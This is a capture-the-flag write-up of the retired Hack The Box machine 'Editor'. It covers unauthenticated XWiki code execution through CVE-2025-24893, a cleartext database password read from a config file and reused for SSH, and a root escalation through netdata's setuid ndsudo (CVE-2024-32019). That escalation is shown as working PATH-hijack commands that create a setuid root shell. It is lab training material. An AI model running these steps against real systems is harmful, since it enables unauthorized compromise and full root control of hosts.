# Editor — Hack The Box, Easy, Linux

*Flags redacted. Machine confirmed retired before publication.*

**TL;DR:** An XWiki instance one minor version behind the fix for
CVE-2025-24893 hands out unauthenticated code execution through its search
macro; the wiki's own Hibernate config leaks a database password in cleartext;
that password is also a real user's SSH password; and that user is in the
`netdata` group, where a setuid `ndsudo` from netdata 1.45.2 resolves its helper
binaries through `$PATH`.

## Reconnaissance

Three ports, and the full 65535-port sweep confirmed there were no others.

    nmap -sCV -p22,80,8080 10.129.x.x

    22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    80/tcp   open  http  nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://editor.htb/
    8080/tcp open  http  Jetty 10.0.20
    |_http-title: XWiki - Main - Intro

Two things are worth pausing on. First, the redirect on port 80 is the usual
signal that name-based virtual hosting is in play — `editor.htb` goes into
`/etc/hosts` before anything else. Second, port 8080 announced the application
by name in the nmap output alone: a `robots.txt` with fifty `/xwiki/bin/...`
entries and a title of `XWiki - Main - Intro`. When a scan tells you the product
outright, the next move is not to fuzz directories; it is to pin the version.

Port 80 turned out to be a static React landing page for a fictional product,
which is a common shape on lab boxes: the interesting surface is elsewhere and
the landing page's job is to point at it. Reading the JS bundle rather than the
rendered page is the faster route to that pointer:

    curl -s http://editor.htb/assets/index-VRKEJlit.js | strings \
      | grep -oE 'https?://[a-z0-9._:/-]+|[a-z0-9._-]+\.htb'

    editor.htb
    http://wiki.editor.htb/xwiki/

So `wiki.editor.htb` joins `/etc/hosts` too.

## Pinning the version

XWiki does not advertise its version in a header, but it does ship its own
version inside webjar and platform-artifact paths in every page it renders:

    curl -s http://editor.htb:8080/xwiki/bin/view/Main/ \
      | grep -oiE 'xwiki[^"<]*[0-9]+\.[0-9]+\.[0-9]+' | sort -u

    XWiki Debian 15.10.8
    xwiki-platform-distribution-debian-common:15.10.8
    xwiki/xwiki-platform-job-webjar/15.10.8

**15.10.8.** That is a precise version, which is the whole point — "XWiki 15" is
not actionable, `15.10.8` is. The CVE hunt against that exact string returns
CVE-2025-24893: unauthenticated RCE via Groovy injection in the `SolrSearch`
macro, fixed in 15.10.11 / 16.4.1. This box is three patch releases short.

Reading the advisory (not a walkthrough — the *mechanism*) gives the shape: the
`text` parameter of the SolrSearch endpoint is interpolated into wiki syntax and
then evaluated, so a payload that closes the enclosing macro and opens a
`{{groovy}}` block executes on the server.

## Foothold — CVE-2025-24893

    GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=<payload>

where the payload closes the macro with `}}}`, opens
`{{async async=false}}{{groovy}}`, and calls `println(...)`. The detail that
makes this pleasant to work with is the `media=rss` parameter: the search term
is echoed back inside the feed's `<title>` element, so whatever Groovy prints
comes back in the HTTP response body. No callback, no listener, no outbound
connectivity required.

    $ python3 cve-2025-24893.py 'id'
    <title>RSS feed for search on [}}}uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)]</title>

That is the foothold: arbitrary command execution as the `xwiki` service
account, unauthenticated, in-band.

A note on the wrapper. `"cmd".execute()` in Groovy does not go through a shell,
so pipes, redirection and `;` are silently swallowed — the first version of the
script appeared to "work" while quietly ignoring half of every command. Wrapping
the command as `["/bin/bash","-c", ...].execute()` and base64-encoding the inner
command sidesteps both that and the URL-encoding minefield.

A reverse shell does land here (egress was open), but for enumeration the
in-band wrapper is strictly better: it is scriptable, it survives, and it does
not need a listener. The reverse shell was worth firing once, purely to
establish that egress *was* open, which is a fact worth knowing before you plan
around it.

## Lateral movement — the config file, then the reuse

The `xwiki` account cannot read `/home/oliver`, so the question is what the
application knows that its account can read. For a Java web app that means the
datasource configuration:

    xwiki@editor$ grep -A1 connection.password /etc/xwiki/hibernate.cfg.xml
    theEd1t0rTeam99

    $ ls -l /etc/xwiki/hibernate.cfg.xml
    -rw-r--r-- 1 root root 16171 Jun 16  2025 /etc/xwiki/hibernate.cfg.xml

Mode 644 — the service account did not even need to be the intended reader.

From here the obvious move is credential reuse, and `/home` had already shown a
single occupant:

    $ sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.x.x
    oliver@editor:~$ id
    uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)

    oliver@editor:~$ cat user.txt
    <32-hex-flag>

The `netdata` group in that `id` output is the entire privesc, and it is visible
the second you land. That is worth internalising: read `id` properly on every
new shell. A supplementary group that is not `users`, `sudo` or the user's own
is almost always there for a reason.

## Privilege escalation — CVE-2024-32019

Two observations, both from ordinary enumeration:

    $ find / -perm -4000 -type f 2>/dev/null
    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
    ...

    $ /opt/netdata/usr/sbin/netdata -V
    netdata v1.45.2

    $ ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
    -rwsr-x--- 1 root netdata 200576 Apr  1  2024 ndsudo

Setuid root, group `netdata`, and `oliver` is in `netdata`. The version pins the
CVE the same way it did on the web side: netdata before 1.45.3 has
CVE-2024-32019 in exactly this binary.

`ndsudo` is netdata's answer to "collectors need to run a few hardware tools as
root". It carries a hardcoded allow-list of subcommands, visible in the binary:

    $ strings ndsudo | grep -E 'nvme|megacli|arcconf'
    nvme-list
    list --output-format=json
    nvme
    megacli-disk-info
    ...

The allow-list constrains the *name* of the binary it runs. It does not
constrain which binary that name resolves to, because the lookup goes through
`$PATH`. So:

    $ mkdir /tmp/.ndp
    $ cat > /tmp/.ndp/nvme <<'EOF'
    #!/bin/bash
    cp /bin/bash /tmp/.ndp/rootbash
    chmod 6755 /tmp/.ndp/rootbash
    EOF
    $ chmod +x /tmp/.ndp/nvme
    $ PATH=/tmp/.ndp:$PATH ndsudo nvme-list
    $ ls -l /tmp/.ndp/rootbash
    -rwsr-sr-x 1 oliver oliver 1396520 ... rootbash

### The wrong turn

Owned by `oliver`, not `root`. The exploit "worked" — the helper ran — and
produced nothing.

The instinct at this point is to doubt the CVE: wrong version, backported fix,
hardened build. That instinct was wrong, and it is worth showing why, because
the actual cause is a generic trap that has nothing to do with netdata.

Instrumenting the helper to report its own identity is a two-line diagnostic and
settles it immediately:

    $ cat /tmp/.ndp/nvme
    #!/bin/bash
    id > /tmp/.ndp/who.txt

    $ PATH=/tmp/.ndp:$PATH ndsudo nvme-list
    $ cat /tmp/.ndp/who.txt
    uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)

No `euid=0`. The helper was invoked with euid 0 — and then dropped it, before
running a single line of the script. That is **bash's own** privilege-dropping
behaviour: when bash starts and finds euid ≠ uid, it resets euid to uid unless
started with `-p`. The setuid execution was fine; the interpreter threw it away
on the shebang line.

    #!/bin/bash -p

    $ PATH=/tmp/.ndp:$PATH ndsudo nvme-list
    $ ls -l /tmp/.ndp/rootbash
    -rwsr-sr-x 1 root oliver 1396520 ... rootbash

    $ /tmp/.ndp/rootbash -p
    rootbash-5.1# id
    uid=1000(oliver) gid=1000(oliver) euid=0(root) groups=1000(oliver),999(netdata)

    rootbash-5.1# cat /root/root.txt
    <32-hex-flag>

The general lesson, which applies to every setuid-payload technique and not just
this CVE: **a shell script is a bad payload for a setuid primitive.** `bash`,
`dash` and `sh` all drop euid by default; `perl` warns and refuses; a compiled
C binary calling `setuid(0)` has no such behaviour. If your setuid vector fires
cleanly and the result is owned by the unprivileged user, suspect the
interpreter before you suspect the vulnerability.

## What made this box tractable

Both halves of the chain were the same move: **pin the exact version, then look
up what is wrong with that exact version.** XWiki did not report its version in
a header, but it leaked it in webjar paths; netdata did not report its version
anywhere in the filesystem layout, but `netdata -V` answered directly. Neither
step needed a scanner, and neither needed creativity — it needed the discipline
to get from "XWiki" to "15.10.8" before searching.

The one step that was not a CVE — the config file to the SSH password — is also
the one an organisation could most cheaply have prevented, and the one most
likely to recur.
